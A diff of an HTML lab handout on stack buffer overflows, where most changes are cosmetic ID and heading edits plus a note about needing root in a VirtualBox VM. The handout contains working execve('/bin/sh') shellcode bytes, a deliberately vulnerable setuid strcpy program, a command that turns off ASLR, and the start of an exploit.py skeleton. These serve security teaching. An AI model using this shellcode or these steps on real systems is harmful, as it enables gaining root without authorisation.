@@ -245,8 +245,7 @@
 <ul>
 <li><a href="#setup">1. Setup</a>
 <ul>
-<li><a href="#turning-off-countermeasures">1.1. Turning off
-countermeasures</a></li>
+<li><a href="#countermeasures">1.1. Turning off countermeasures</a></li>
 </ul></li>
 <li><a href="#shellcode">2. Shellcode</a>
 <ul>
@@ -256,8 +255,8 @@ shellcode</a></li>
 <li><a href="#a-vulnerable-program">3. A vulnerable program</a>
 <ul>
 <li><a href="#compilation">3.1. Compilation</a></li>
-<li><a href="#launching-attack-on-32-bit-program">3.2. Launching Attack
-on 32-bit Program</a></li>
+<li><a href="#launching-an-attack-on-a-32-bit-program">3.2. Launching an
+attack on a 32-bit program</a></li>
 </ul></li>
 </ul>
 </nav>
@@ -268,9 +267,28 @@ vulnerabilities and see how they can be exploited. You will be given a
 <code>setuid</code> program with a buffer overflow vulnerability, and
 your task is to develop a scheme to exploit the vulnerability and gain
 root privileges.</p>
+<div style="border: solid 2pt orange; background-color: hsl(22.35, 100%, 85%, 1); padding: 1em;">
+<p><strong>Note – use of Vagrant+VirtualBox required</strong></p>
+<p>Completing this lab requires you to have root access to the Linux
+kernel of the VM (or other machine) you’re running on. Otherwise, the
+command</p>
+<pre><code>sudo sysctl -w kernel.randomize_va_space=0</code></pre>
+<p>(in section 1.1, <a href="#countermeasures">Turning off
+countermeasures</a>) will fail. The <a href="https://gitpod.io/">GitPod</a> environment does
+<strong><em>not</em></strong> give you root access to the kernel; while
+using GitPod, you are running within a security-restricted <a href="https://docs.docker.com/get-started/overview/">Docker
+container</a> <em>within</em> a VM, and will be unable to change the way
+the kernel is running.</p>
+<p>To complete this lab, you’ll need to use Vagrant (as outlined in Lab
+1) to run a VirtualBox VM. Within that VM, you <em>do</em> have root
+access to the kernel, and the command should complete successfully.</p>
+<p>If you can’t run Vagrant and VirtualBox on your laptop, it’s
+recommended you pair up with a student who is able to, and complete the
+lab working with them. If you’re unable to do that, please let your lab
+facilitator know, and we’ll see if we can provide an alternative.</p>
+</div>
 <h2 id="setup">1. Setup</h2>
-<h3 id="turning-off-countermeasures">1.1. Turning off
-countermeasures</h3>
+<h3 id="countermeasures">1.1. Turning off countermeasures</h3>
 <p>Modern operating systems implement several security mechanisms to
 make buffer overflow attacks more difficult. To simplify our attacks, we
 need to disable them first.</p>
@@ -374,14 +392,14 @@ sequence of bytes – into a location on the stack, and try to convince
 the target program to execute it.</p>
 <p>Represented in C, a piece of shellcode might look like the
 following:</p>
-<div class="sourceCode" id="cb6"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
-<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">()</span> <span class="op">{</span></span>
-<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> <span class="op">*</span>name<span class="op">[</span><span class="dv">2</span><span class="op">];</span></span>
-<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a>  name<span class="op">[</span><span class="dv">0</span><span class="op">]</span> <span class="op">=</span> <span class="st">&quot;/bin/sh&quot;</span><span class="op">;</span></span>
-<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a>  name<span class="op">[</span><span class="dv">1</span><span class="op">]</span> <span class="op">=</span> NULL<span class="op">;</span></span>
-<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a>  execve<span class="op">(</span>name<span class="op">[</span><span class="dv">0</span><span class="op">],</span> name<span class="op">,</span> NULL<span class="op">);</span></span>
-<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<div class="sourceCode" id="cb7"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">()</span> <span class="op">{</span></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> <span class="op">*</span>name<span class="op">[</span><span class="dv">2</span><span class="op">];</span></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a>  name<span class="op">[</span><span class="dv">0</span><span class="op">]</span> <span class="op">=</span> <span class="st">&quot;/bin/sh&quot;</span><span class="op">;</span></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>  name<span class="op">[</span><span class="dv">1</span><span class="op">]</span> <span class="op">=</span> NULL<span class="op">;</span></span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a>  execve<span class="op">(</span>name<span class="op">[</span><span class="dv">0</span><span class="op">],</span> name<span class="op">,</span> NULL<span class="op">);</span></span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
 <p>Read about the Linux <code>execve</code> system call by typing <a href="https://man7.org/linux/man-pages/man2/execve.2.html"><code>man execve</code></a>;
 it allows us to execute a program from C code. The <code>name</code>
 array is effectively a list of pointers-to-<code>char</code>, with a
@@ -404,25 +422,25 @@ program using <code>gcc</code>.)</p>
 assembly. The Intel 32-bit assembly code equivalent for the above C code
 would be something like the following (which you are not required to
 understand, but is presented here for interest):</p>
-<div class="sourceCode" id="cb8"><pre class="sourceCode numberSource asm numberLines"><code class="sourceCode fasm"><span id="cb8-1"><a href="#cb8-1"></a><span class="co">; Store the command on stack</span></span>
-<span id="cb8-2"><a href="#cb8-2"></a><span class="bu">xor</span>  <span class="kw">eax</span><span class="op">,</span> <span class="kw">eax</span></span>
-<span id="cb8-3"><a href="#cb8-3"></a><span class="bu">push</span> <span class="kw">eax</span></span>
-<span id="cb8-4"><a href="#cb8-4"></a><span class="bu">push</span> <span class="st">&quot;//sh&quot;</span></span>
-<span id="cb8-5"><a href="#cb8-5"></a><span class="bu">push</span> <span class="st">&quot;/bin&quot;</span></span>
-<span id="cb8-6"><a href="#cb8-6"></a><span class="bu">mov</span>  <span class="kw">ebx</span><span class="op">,</span> <span class="kw">esp</span> <span class="co">; ebx --&gt; &quot;/bin//sh&quot;: execve()&#39;s 1st argument</span></span>
-<span id="cb8-7"><a href="#cb8-7"></a></span>
-<span id="cb8-8"><a href="#cb8-8"></a><span class="co">; Construct the argument array argv[]</span></span>
-<span id="cb8-9"><a href="#cb8-9"></a><span class="bu">push</span> <span class="kw">eax</span> <span class="co">; argv[1] = 0</span></span>
-<span id="cb8-10"><a href="#cb8-10"></a><span class="bu">push</span> <span class="kw">ebx</span> <span class="co">; argv[0] --&gt; &quot;/bin//sh&quot;</span></span>
-<span id="cb8-11"><a href="#cb8-11"></a><span class="bu">mov</span> <span class="kw">ecx</span><span class="op">,</span> <span class="kw">esp</span> <span class="co">; ecx --&gt; argv[]: execve()&#39;s 2nd argument</span></span>
-<span id="cb8-12"><a href="#cb8-12"></a></span>
-<span id="cb8-13"><a href="#cb8-13"></a><span class="co">; For environment variable</span></span>
-<span id="cb8-14"><a href="#cb8-14"></a><span class="bu">xor</span> <span class="kw">edx</span><span class="op">,</span> <span class="kw">edx</span> <span class="co">; edx = 0: execve()&#39;s 3rd argument</span></span>
-<span id="cb8-15"><a href="#cb8-15"></a></span>
-<span id="cb8-16"><a href="#cb8-16"></a><span class="co">; Invoke execve()</span></span>
-<span id="cb8-17"><a href="#cb8-17"></a><span class="bu">xor</span> <span class="kw">eax</span><span class="op">,</span> <span class="kw">eax</span> <span class="co">;</span></span>
-<span id="cb8-18"><a href="#cb8-18"></a><span class="bu">mov</span> <span class="kw">al</span><span class="op">,</span> <span class="bn">0x0b</span> <span class="co">; execve()&#39;s system call number</span></span>
-<span id="cb8-19"><a href="#cb8-19"></a><span class="bu">int</span> <span class="bn">0x80</span></span></code></pre></div>
+<div class="sourceCode" id="cb9"><pre class="sourceCode numberSource asm numberLines"><code class="sourceCode fasm"><span id="cb9-1"><a href="#cb9-1"></a><span class="co">; Store the command on stack</span></span>
+<span id="cb9-2"><a href="#cb9-2"></a><span class="bu">xor</span>  <span class="kw">eax</span><span class="op">,</span> <span class="kw">eax</span></span>
+<span id="cb9-3"><a href="#cb9-3"></a><span class="bu">push</span> <span class="kw">eax</span></span>
+<span id="cb9-4"><a href="#cb9-4"></a><span class="bu">push</span> <span class="st">&quot;//sh&quot;</span></span>
+<span id="cb9-5"><a href="#cb9-5"></a><span class="bu">push</span> <span class="st">&quot;/bin&quot;</span></span>
+<span id="cb9-6"><a href="#cb9-6"></a><span class="bu">mov</span>  <span class="kw">ebx</span><span class="op">,</span> <span class="kw">esp</span> <span class="co">; ebx --&gt; &quot;/bin//sh&quot;: execve()&#39;s 1st argument</span></span>
+<span id="cb9-7"><a href="#cb9-7"></a></span>
+<span id="cb9-8"><a href="#cb9-8"></a><span class="co">; Construct the argument array argv[]</span></span>
+<span id="cb9-9"><a href="#cb9-9"></a><span class="bu">push</span> <span class="kw">eax</span> <span class="co">; argv[1] = 0</span></span>
+<span id="cb9-10"><a href="#cb9-10"></a><span class="bu">push</span> <span class="kw">ebx</span> <span class="co">; argv[0] --&gt; &quot;/bin//sh&quot;</span></span>
+<span id="cb9-11"><a href="#cb9-11"></a><span class="bu">mov</span> <span class="kw">ecx</span><span class="op">,</span> <span class="kw">esp</span> <span class="co">; ecx --&gt; argv[]: execve()&#39;s 2nd argument</span></span>
+<span id="cb9-12"><a href="#cb9-12"></a></span>
+<span id="cb9-13"><a href="#cb9-13"></a><span class="co">; For environment variable</span></span>
+<span id="cb9-14"><a href="#cb9-14"></a><span class="bu">xor</span> <span class="kw">edx</span><span class="op">,</span> <span class="kw">edx</span> <span class="co">; edx = 0: execve()&#39;s 3rd argument</span></span>
+<span id="cb9-15"><a href="#cb9-15"></a></span>
+<span id="cb9-16"><a href="#cb9-16"></a><span class="co">; Invoke execve()</span></span>
+<span id="cb9-17"><a href="#cb9-17"></a><span class="bu">xor</span> <span class="kw">eax</span><span class="op">,</span> <span class="kw">eax</span> <span class="co">;</span></span>
+<span id="cb9-18"><a href="#cb9-18"></a><span class="bu">mov</span> <span class="kw">al</span><span class="op">,</span> <span class="bn">0x0b</span> <span class="co">; execve()&#39;s system call number</span></span>
+<span id="cb9-19"><a href="#cb9-19"></a><span class="bu">int</span> <span class="bn">0x80</span></span></code></pre></div>
 <p>A brief explanation of the code (again, you’re not required to
 understand this in detail) is:</p>
 <ul>
@@ -496,37 +514,37 @@ into the VM (you can use the command
 unzip it.</p>
 <p><code>cd</code> into the <code>shellcode</code> directory, and take a
 look at <code>call_shellcode.c</code> (reproduced below):</p>
-<div class="sourceCode" id="cb10"><pre class="sourceCode numberSource C numberLines"><code class="sourceCode c"><span id="cb10-1"><a href="#cb10-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
-<span id="cb10-2"><a href="#cb10-2"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
-<span id="cb10-3"><a href="#cb10-3"></a><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></span>
-<span id="cb10-4"><a href="#cb10-4"></a></span>
-<span id="cb10-5"><a href="#cb10-5"></a><span class="co">// Binary code for setuid(0) </span></span>
-<span id="cb10-6"><a href="#cb10-6"></a><span class="co">// 64-bit:  &quot;\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05&quot;</span></span>
-<span id="cb10-7"><a href="#cb10-7"></a><span class="co">// 32-bit:  &quot;\x31\xdb\x31\xc0\xb0\xd5\xcd\x80&quot;</span></span>
-<span id="cb10-8"><a href="#cb10-8"></a></span>
-<span id="cb10-9"><a href="#cb10-9"></a></span>
-<span id="cb10-10"><a href="#cb10-10"></a><span class="dt">const</span> <span class="dt">char</span> shellcode<span class="op">[]</span> <span class="op">=</span></span>
-<span id="cb10-11"><a href="#cb10-11"></a><span class="pp">#if __x86_64__</span></span>
-<span id="cb10-12"><a href="#cb10-12"></a>  <span class="st">&quot;</span><span class="sc">\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e</span><span class="st">&quot;</span></span>
-<span id="cb10-13"><a href="#cb10-13"></a>  <span class="st">&quot;</span><span class="sc">\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57</span><span class="st">&quot;</span></span>
-<span id="cb10-14"><a href="#cb10-14"></a>  <span class="st">&quot;</span><span class="sc">\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05</span><span class="st">&quot;</span></span>
-<span id="cb10-15"><a href="#cb10-15"></a><span class="pp">#else</span></span>
-<span id="cb10-16"><a href="#cb10-16"></a>  <span class="st">&quot;</span><span class="sc">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f</span><span class="st">&quot;</span></span>
-<span id="cb10-17"><a href="#cb10-17"></a>  <span class="st">&quot;</span><span class="sc">\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31</span><span class="st">&quot;</span></span>
-<span id="cb10-18"><a href="#cb10-18"></a>  <span class="st">&quot;</span><span class="sc">\xd2\x31\xc0\xb0\x0b\xcd\x80</span><span class="st">&quot;</span></span>
-<span id="cb10-19"><a href="#cb10-19"></a><span class="pp">#endif</span></span>
-<span id="cb10-20"><a href="#cb10-20"></a><span class="op">;</span></span>
-<span id="cb10-21"><a href="#cb10-21"></a></span>
-<span id="cb10-22"><a href="#cb10-22"></a><span class="dt">int</span> main<span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span> <span class="dt">char</span> <span class="op">**</span>argv<span class="op">)</span></span>
-<span id="cb10-23"><a href="#cb10-23"></a><span class="op">{</span></span>
-<span id="cb10-24"><a href="#cb10-24"></a>   <span class="dt">char</span> code<span class="op">[</span><span class="dv">500</span><span class="op">];</span></span>
-<span id="cb10-25"><a href="#cb10-25"></a></span>
-<span id="cb10-26"><a href="#cb10-26"></a>   strcpy<span class="op">(</span>code<span class="op">,</span> shellcode<span class="op">);</span></span>
-<span id="cb10-27"><a href="#cb10-27"></a>   <span class="dt">int</span> <span class="op">(*</span>func<span class="op">)()</span> <span class="op">=</span> <span class="op">(</span><span class="dt">int</span><span class="op">(*)())</span>code<span class="op">;</span></span>
-<span id="cb10-28"><a href="#cb10-28"></a></span>
-<span id="cb10-29"><a href="#cb10-29"></a>   func<span class="op">();</span></span>
-<span id="cb10-30"><a href="#cb10-30"></a>   <span class="cf">return</span> <span class="dv">1</span><span class="op">;</span></span>
-<span id="cb10-31"><a href="#cb10-31"></a><span class="op">}</span></span></code></pre></div>
+<div class="sourceCode" id="cb11"><pre class="sourceCode numberSource C numberLines"><code class="sourceCode c"><span id="cb11-1"><a href="#cb11-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
+<span id="cb11-2"><a href="#cb11-2"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
+<span id="cb11-3"><a href="#cb11-3"></a><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></span>
+<span id="cb11-4"><a href="#cb11-4"></a></span>
+<span id="cb11-5"><a href="#cb11-5"></a><span class="co">// Binary code for setuid(0) </span></span>
+<span id="cb11-6"><a href="#cb11-6"></a><span class="co">// 64-bit:  &quot;\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05&quot;</span></span>
+<span id="cb11-7"><a href="#cb11-7"></a><span class="co">// 32-bit:  &quot;\x31\xdb\x31\xc0\xb0\xd5\xcd\x80&quot;</span></span>
+<span id="cb11-8"><a href="#cb11-8"></a></span>
+<span id="cb11-9"><a href="#cb11-9"></a></span>
+<span id="cb11-10"><a href="#cb11-10"></a><span class="dt">const</span> <span class="dt">char</span> shellcode<span class="op">[]</span> <span class="op">=</span></span>
+<span id="cb11-11"><a href="#cb11-11"></a><span class="pp">#if __x86_64__</span></span>
+<span id="cb11-12"><a href="#cb11-12"></a>  <span class="st">&quot;</span><span class="sc">\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e</span><span class="st">&quot;</span></span>
+<span id="cb11-13"><a href="#cb11-13"></a>  <span class="st">&quot;</span><span class="sc">\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57</span><span class="st">&quot;</span></span>
+<span id="cb11-14"><a href="#cb11-14"></a>  <span class="st">&quot;</span><span class="sc">\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05</span><span class="st">&quot;</span></span>
+<span id="cb11-15"><a href="#cb11-15"></a><span class="pp">#else</span></span>
+<span id="cb11-16"><a href="#cb11-16"></a>  <span class="st">&quot;</span><span class="sc">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f</span><span class="st">&quot;</span></span>
+<span id="cb11-17"><a href="#cb11-17"></a>  <span class="st">&quot;</span><span class="sc">\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31</span><span class="st">&quot;</span></span>
+<span id="cb11-18"><a href="#cb11-18"></a>  <span class="st">&quot;</span><span class="sc">\xd2\x31\xc0\xb0\x0b\xcd\x80</span><span class="st">&quot;</span></span>
+<span id="cb11-19"><a href="#cb11-19"></a><span class="pp">#endif</span></span>
+<span id="cb11-20"><a href="#cb11-20"></a><span class="op">;</span></span>
+<span id="cb11-21"><a href="#cb11-21"></a></span>
+<span id="cb11-22"><a href="#cb11-22"></a><span class="dt">int</span> main<span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span> <span class="dt">char</span> <span class="op">**</span>argv<span class="op">)</span></span>
+<span id="cb11-23"><a href="#cb11-23"></a><span class="op">{</span></span>
+<span id="cb11-24"><a href="#cb11-24"></a>   <span class="dt">char</span> code<span class="op">[</span><span class="dv">500</span><span class="op">];</span></span>
+<span id="cb11-25"><a href="#cb11-25"></a></span>
+<span id="cb11-26"><a href="#cb11-26"></a>   strcpy<span class="op">(</span>code<span class="op">,</span> shellcode<span class="op">);</span></span>
+<span id="cb11-27"><a href="#cb11-27"></a>   <span class="dt">int</span> <span class="op">(*</span>func<span class="op">)()</span> <span class="op">=</span> <span class="op">(</span><span class="dt">int</span><span class="op">(*)())</span>code<span class="op">;</span></span>
+<span id="cb11-28"><a href="#cb11-28"></a></span>
+<span id="cb11-29"><a href="#cb11-29"></a>   func<span class="op">();</span></span>
+<span id="cb11-30"><a href="#cb11-30"></a>   <span class="cf">return</span> <span class="dv">1</span><span class="op">;</span></span>
+<span id="cb11-31"><a href="#cb11-31"></a><span class="op">}</span></span></code></pre></div>
 <p>The purpose of this program is to demonstrate that our shellcode
 byte-sequence does indeed invoke the shell <code>/bin/sh</code>.</p>
 <p>The byte sequences are stored in the array <code>shellcode</code> –
@@ -566,52 +584,52 @@ zip file. This program has a buffer overflow vulnerability, and your job
 is to exploit this vulnerability and gain root privileges. The essential
 parts are shown below (some inessential functions have been
 omitted):</p>
-<div class="sourceCode" id="cb11"><pre class="sourceCode numberSource C numberLines"><code class="sourceCode c"><span id="cb11-1"><a href="#cb11-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
-<span id="cb11-2"><a href="#cb11-2"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
-<span id="cb11-3"><a href="#cb11-3"></a><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></span>
-<span id="cb11-4"><a href="#cb11-4"></a></span>
-<span id="cb11-5"><a href="#cb11-5"></a></span>
-<span id="cb11-6"><a href="#cb11-6"></a><span class="pp">#ifndef BUF_SIZE</span></span>
-<span id="cb11-7"><a href="#cb11-7"></a><span class="pp">#define BUF_SIZE 100</span></span>
-<span id="cb11-8"><a href="#cb11-8"></a><span class="pp">#endif</span></span>
-<span id="cb11-9"><a href="#cb11-9"></a></span>
-<span id="cb11-10"><a href="#cb11-10"></a><span class="dt">int</span> bof<span class="op">(</span><span class="dt">char</span> <span class="op">*</span>str<span class="op">)</span> <span class="op">{</span></span>
-<span id="cb11-11"><a href="#cb11-11"></a>    <span class="dt">char</span> buffer<span class="op">[</span>BUF_SIZE<span class="op">];</span></span>
-<span id="cb11-12"><a href="#cb11-12"></a></span>
-<span id="cb11-13"><a href="#cb11-13"></a>    <span class="co">// The following statement has a buffer overflow problem </span></span>
-<span id="cb11-14"><a href="#cb11-14"></a>    strcpy<span class="op">(</span>buffer<span class="op">,</span> str<span class="op">);</span></span>
-<span id="cb11-15"><a href="#cb11-15"></a></span>
-<span id="cb11-16"><a href="#cb11-16"></a>    <span class="cf">return</span> <span class="dv">1</span><span class="op">;</span></span>
-<span id="cb11-17"><a href="#cb11-17"></a><span class="op">}</span></span>
-<span id="cb11-18"><a href="#cb11-18"></a></span>
-<span id="cb11-19"><a href="#cb11-19"></a><span class="dt">int</span> main<span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span> <span class="dt">char</span> <span class="op">**</span>argv<span class="op">)</span> <span class="op">{</span></span>
-<span id="cb11-20"><a href="#cb11-20"></a>    <span class="dt">char</span> str<span class="op">[</span><span class="dv">517</span><span class="op">];</span></span>
-<span id="cb11-21"><a href="#cb11-21"></a>    <span class="dt">FILE</span> <span class="op">*</span>badfile<span class="op">;</span></span>
-<span id="cb11-22"><a href="#cb11-22"></a></span>
-<span id="cb11-23"><a href="#cb11-23"></a>    badfile <span class="op">=</span> fopen<span class="op">(</span><span class="st">&quot;badfile&quot;</span><span class="op">,</span> <span class="st">&quot;r&quot;</span><span class="op">);</span> </span>
-<span id="cb11-24"><a href="#cb11-24"></a>    <span class="cf">if</span> <span class="op">(!</span>badfile<span class="op">)</span> <span class="op">{</span></span>
-<span id="cb11-25"><a href="#cb11-25"></a>       perror<span class="op">(</span><span class="st">&quot;Opening badfile&quot;</span><span class="op">);</span> exit<span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
-<span id="cb11-26"><a href="#cb11-26"></a>    <span class="op">}</span></span>
-<span id="cb11-27"><a href="#cb11-27"></a></span>
-<span id="cb11-28"><a href="#cb11-28"></a>    <span class="dt">int</span> length <span class="op">=</span> fread<span class="op">(</span>str<span class="op">,</span> <span class="kw">sizeof</span><span class="op">(</span><span class="dt">char</span><span class="op">),</span> <span class="dv">517</span><span class="op">,</span> badfile<span class="op">);</span></span>
-<span id="cb11-29"><a href="#cb11-29"></a>    printf<span class="op">(</span><span class="st">&quot;Input size: %d</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> length<span class="op">);</span></span>
-<span id="cb11-30"><a href="#cb11-30"></a>    fprintf<span class="op">(</span>stdout<span class="op">,</span> <span class="st">&quot;==== Returned Properly ====</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
-<span id="cb11-31"><a href="#cb11-31"></a>    <span class="cf">return</span> <span class="dv">1</span><span class="op">;</span></span>
-<span id="cb11-32"><a href="#cb11-32"></a><span class="op">}</span></span></code></pre></div>
+<div class="sourceCode" id="cb12"><pre class="sourceCode numberSource C numberLines"><code class="sourceCode c"><span id="cb12-1"><a href="#cb12-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
+<span id="cb12-2"><a href="#cb12-2"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
+<span id="cb12-3"><a href="#cb12-3"></a><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></span>
+<span id="cb12-4"><a href="#cb12-4"></a></span>
+<span id="cb12-5"><a href="#cb12-5"></a></span>
+<span id="cb12-6"><a href="#cb12-6"></a><span class="pp">#ifndef BUF_SIZE</span></span>
+<span id="cb12-7"><a href="#cb12-7"></a><span class="pp">#define BUF_SIZE 100</span></span>
+<span id="cb12-8"><a href="#cb12-8"></a><span class="pp">#endif</span></span>
+<span id="cb12-9"><a href="#cb12-9"></a></span>
+<span id="cb12-10"><a href="#cb12-10"></a><span class="dt">int</span> bof<span class="op">(</span><span class="dt">char</span> <span class="op">*</span>str<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb12-11"><a href="#cb12-11"></a>    <span class="dt">char</span> buffer<span class="op">[</span>BUF_SIZE<span class="op">];</span></span>
+<span id="cb12-12"><a href="#cb12-12"></a></span>
+<span id="cb12-13"><a href="#cb12-13"></a>    <span class="co">// The following statement has a buffer overflow problem </span></span>
+<span id="cb12-14"><a href="#cb12-14"></a>    strcpy<span class="op">(</span>buffer<span class="op">,</span> str<span class="op">);</span></span>
+<span id="cb12-15"><a href="#cb12-15"></a></span>
+<span id="cb12-16"><a href="#cb12-16"></a>    <span class="cf">return</span> <span class="dv">1</span><span class="op">;</span></span>
+<span id="cb12-17"><a href="#cb12-17"></a><span class="op">}</span></span>
+<span id="cb12-18"><a href="#cb12-18"></a></span>
+<span id="cb12-19"><a href="#cb12-19"></a><span class="dt">int</span> main<span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span> <span class="dt">char</span> <span class="op">**</span>argv<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb12-20"><a href="#cb12-20"></a>    <span class="dt">char</span> str<span class="op">[</span><span class="dv">517</span><span class="op">];</span></span>
+<span id="cb12-21"><a href="#cb12-21"></a>    <span class="dt">FILE</span> <span class="op">*</span>badfile<span class="op">;</span></span>
+<span id="cb12-22"><a href="#cb12-22"></a></span>
+<span id="cb12-23"><a href="#cb12-23"></a>    badfile <span class="op">=</span> fopen<span class="op">(</span><span class="st">&quot;badfile&quot;</span><span class="op">,</span> <span class="st">&quot;r&quot;</span><span class="op">);</span> </span>
+<span id="cb12-24"><a href="#cb12-24"></a>    <span class="cf">if</span> <span class="op">(!</span>badfile<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb12-25"><a href="#cb12-25"></a>       perror<span class="op">(</span><span class="st">&quot;Opening badfile&quot;</span><span class="op">);</span> exit<span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
+<span id="cb12-26"><a href="#cb12-26"></a>    <span class="op">}</span></span>
+<span id="cb12-27"><a href="#cb12-27"></a></span>
+<span id="cb12-28"><a href="#cb12-28"></a>    <span class="dt">int</span> length <span class="op">=</span> fread<span class="op">(</span>str<span class="op">,</span> <span class="kw">sizeof</span><span class="op">(</span><span class="dt">char</span><span class="op">),</span> <span class="dv">517</span><span class="op">,</span> badfile<span class="op">);</span></span>
+<span id="cb12-29"><a href="#cb12-29"></a>    printf<span class="op">(</span><span class="st">&quot;Input size: %d</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> length<span class="op">);</span></span>
+<span id="cb12-30"><a href="#cb12-30"></a>    fprintf<span class="op">(</span>stdout<span class="op">,</span> <span class="st">&quot;==== Returned Properly ====</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb12-31"><a href="#cb12-31"></a>    <span class="cf">return</span> <span class="dv">1</span><span class="op">;</span></span>
+<span id="cb12-32"><a href="#cb12-32"></a><span class="op">}</span></span></code></pre></div>
 <p>The above program has a buffer overflow vulnerability. It first reads
 an input from a file called <code>badfile</code>, and then passes this
 input to another buffer in the function <code>bof()</code>. The original
 input can have a maximum length of 517 bytes, but the buffer in
-<code>bof()</code> is only <code>BUF SIZE</code> bytes long, which is
+<code>bof()</code> is only <code>BUF_SIZE</code> bytes long, which is
 less than 517. Because <code>strcpy()</code> does not check boundaries,
 buffer overflow will occur.</p>
 <p>Since this program is a root-owned <code>setuid</code> program, if a
 normal user is able to exploit this vulnerability, the user might be
 able to get a root shell. Note that the program gets its input from a
 file called <code>badfile</code>, which is under users’ control. Now,
-our objective is to create the contents for badfile, such that when the
-vulnerable program copies the contents into its buffer, a root shell can
-be spawned.</p>
+our objective is to create the contents for <code>badfile</code>, such
+that when the vulnerable program copies the contents into its buffer, a
+root shell can be spawned.</p>
 <h3 id="compilation">3.1. Compilation</h3>
 <p>To compile the above vulnerable program, do not forget to turn off
 the stack canaries and the non-executable stack protections using the
@@ -631,8 +649,8 @@ cause the <code>setuid</code> bit to be turned off.</p>
 so we just need to type <code>make</code> to execute those commands. The
 variables L1, …, L4 are set in Makefile; they will be used during the
 compilation.</p>
-<h3 id="launching-attack-on-32-bit-program">3.2. Launching Attack on
-32-bit Program</h3>
+<h3 id="launching-an-attack-on-a-32-bit-program">3.2. Launching an
+attack on a 32-bit program</h3>
 <p>To exploit the buffer-overflow vulnerability in the target program,
 the most important thing to know is the distance between the buffer’s
 starting position and the place where the return-address is stored. We
@@ -678,35 +696,35 @@ We will use a Python program to do that. We provide a skeleton program
 called <code>exploit.py</code>, which is included in the lab zip file.
 The code is incomplete, and students need to replace some of the
 essential values in the code:</p>
-<div class="sourceCode" id="cb15"><pre class="sourceCode numberSource python numberLines"><code class="sourceCode python"><span id="cb15-1"><a href="#cb15-1"></a><span class="co">#!/usr/bin/python3</span></span>
-<span id="cb15-2"><a href="#cb15-2"></a><span class="im">import</span> sys</span>
-<span id="cb15-3"><a href="#cb15-3"></a></span>
-<span id="cb15-4"><a href="#cb15-4"></a><span class="co"># Replace the content with the actual shellcode</span></span>
-<span id="cb15-5"><a href="#cb15-5"></a>shellcode<span class="op">=</span> (</span>
-<span id="cb15-6"><a href="#cb15-6"></a>  <span class="st">&quot;</span><span class="ch">\x90\x90\x90\x90</span><span class="st">&quot;</span>  </span>
-<span id="cb15-7"><a href="#cb15-7"></a>  <span class="st">&quot;</span><span class="ch">\x90\x90\x90\x90</span><span class="st">&quot;</span>  </span>
-<span id="cb15-8"><a href="#cb15-8"></a>).encode(<span class="st">&#39;latin-1&#39;</span>)</span>
